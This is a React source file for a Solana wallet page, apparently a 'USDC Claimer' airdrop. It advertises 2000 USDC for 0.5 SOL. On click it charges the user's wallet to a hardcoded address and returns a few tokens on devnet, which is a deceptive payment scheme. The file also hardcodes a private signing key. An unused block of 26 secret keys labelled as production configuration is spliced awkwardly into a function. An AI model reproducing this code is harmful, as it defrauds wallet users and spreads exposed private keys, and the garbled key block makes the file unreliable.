/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5Fu6wnKhtDN1W2noK1Rwqb7qsTdkTwUKX54SvLyibx1FSP7c4UPsjnU71X4RVAp2SuSfpR1Y8dJCgumsopVUJueh"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "245B8Xr4P3KJ2u6nNJSsiY8GKcafdbeTabSRanGCHfg98VkQV9PXnJQXKz945iDxedZAZMoqtvPQzv4bguKVnXRZ",
  "key1": "5qku65jr6ekhe1rZn1P3i9djy8rVwabtew224R6HTiRZR4CkNS6S6skwBZVHFNQoSXAAsxeuExFQim5nPvkxsDLX",
  "key2": "5nQy8Pa1LUQyunE98oom1BtSzpHDYEFfuiUCba5zUc1UFsrMAFW6Qbyst4HP9nhvc37i9Az2733CaL4RNstCKUDw",
  "key3": "RCQF4f1GyaENN9QG7KNDcXQxRiJygjm6ZUpMZhwSBDTNeHHVp5NgKLdUshNPLepSdnQjVhorjLWpbuZupHBgUnc",
  "key4": "21FSs8SrMh79NeBhX8kgS6336JohicEQEahcPESoc4q25ZCSbRFz9jidnBSajm89LviB7kVSuSRFTrARUX7LckpY",
  "key5": "2wVinLZqx3P4P6RyvFSxkMsFi2cFY5fNjhqPT8pu1QCQfpoRWdaJmFGaJogFNh7bKtQ6phGL7bQmXMwGrNsLtJUg",
  "key6": "FkUT7AMT896pPPGmVXFaakd8z8NFHcbJjgKG1fvJzFR2nZKaaeiVPsyeYtdVbgSyveUNg5f9JE9qVsfLxVonw6m",
  "key7": "whtAzo8XeyesxG7tLmP5KQCe22AzJUrGHKjKVZG5y1buwQzW9bUHXyF8bugFn5eL5CnoBtiEFueSE2tyzmpirS1",
  "key8": "3sDZ6HjvYkspU5QtYE7bWsKUwA2v4EPCWbBMT9Qjp95dXy8EruJESfhH7QZLC3epVz1x3d48Pp5aRQHULmAANNQJ",
  "key9": "2mvLAqr766Wjctz9GiGx1bhRCZDe36ebzUq8eiSU5oWNLWXUq6K21B7qWzTVmoUU1GNnmoyQDR39dJTsWWmsKSjz",
  "key10": "Xo3VNoLJK7xRUrwTKaAievXA32TVjCX8XT9zDK4npYNkAN7zXpJztt6Wm51xMoH9Y9ddKgL5zsJPbpBhsksr16p",
  "key11": "3e8Hw6xbwEXLeHE5fS7AjjCMNWVbBpSfwWnXD3vw7kvFTBkBJV4LR5kNvXFstWo2un9xyQoS66tRq4TxwmGgJ2bS",
  "key12": "45K1DmTzpUbVdQNAY9vN8c5iFYD3BRp2fkjFUz4AJF6NqAVfBv17jwGYWy7GqbXtsE4AkcTiLw6ytoGGrw7Li8H6",
  "key13": "4pV2uJQEbuBNLfY4kBRZeEoCGpFv2PaseYJYmLGZvnqWfFHAH6WGnL6udnYDWZ5HwMwGED51BNMzho2a5VcMhvTJ",
  "key14": "4pCeqh8JFXpKbs7HLv1qwxezy5RyUoE5DUTRzSALe4QCjEUrUiou298G5arsZAuMAdobKzHsUBvT3JY3i2DW6xYZ",
  "key15": "57BLd53sJstKoRWHtd6bCmEmxGq8gEf8xSWSVfTb5bpza6o8PmAGP15jcGGKSgP9n2BpmMxQEoAdp5djbTsrH1Pt",
  "key16": "CWaKxrco2XAhBto4ftpSJx7hVwTQ2Z1zWfbAR6EKPvg4UtEgmhYHf7JJXoSVa2mCPuXHn4HymegZBf3vwSqWHzv",
  "key17": "r8xGM6hV9yn77g23ku74ivtRr7RQ29ZroDipKUXSgGacibFq7yzkcLGc8wRRSrecgcp5vewkpPEsskpTHnzZPLw",
  "key18": "3VTDEYbLwGNqkrAttuTwXcgx8RphGS4uWGK7ZV3gP2UjGDuFCTiBwZtqNGfDxq4fw5qjsf8RRH5f4LmPF813zjTk",
  "key19": "3zRGaufLqX2q8QVqL1m4CegudkwCU7AvsCgdzEm3Jc7aqHfrmtCTavVsjTg78Rf6hqPeW73ts4DLq4DCLEndLfTE",
  "key20": "6cBd759tvNd7S3hmAWfGyDDi36ZLyYzQZcrR2SJUU7cHJvJkxeaj1z4VaeM5Ce3GofD19zDic7QzsWLzivRRWnH",
  "key21": "5mg35ozafRgM9wNYupbAerEZntbk5utzi6TWdXMZkDp9JHHC533YPmsKeRrghMCRs3MMUvi7gF8bcumUS6rJQND8",
  "key22": "45YHeCQhX5dM8qbaufZXXAYxoALXWGAh1c94cm7nxRYB84NYHGGpuCXrkb9wpSRW4KdPPBRhqDbu6hYq8J8pyVry",
  "key23": "QL2HgVZgSf3JtxionSpKcj5HFYbARLVbd9uQ1C7ZV3VpuLNf9iq8BBLZDD3FsrkXSSgc8hTB7ATty9JFv9UnBUB",
  "key24": "3tDq2s9d4CpsFAk8A9pTxi6xFaFXEn5bmEuUhFCUJAdCu6S3pAQzquofvKdTq9WfCRvGXHP3eJDtGiD1Dn3oAB1v",
  "key25": "kQS8MGkMM8eXXqjsgLhhKg8oMuvjmavBHHPPs1aGdyrSdnm6vBvxvG5EJvwWR2zr5DsmKSAeStVtwHcijvaUt6U"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
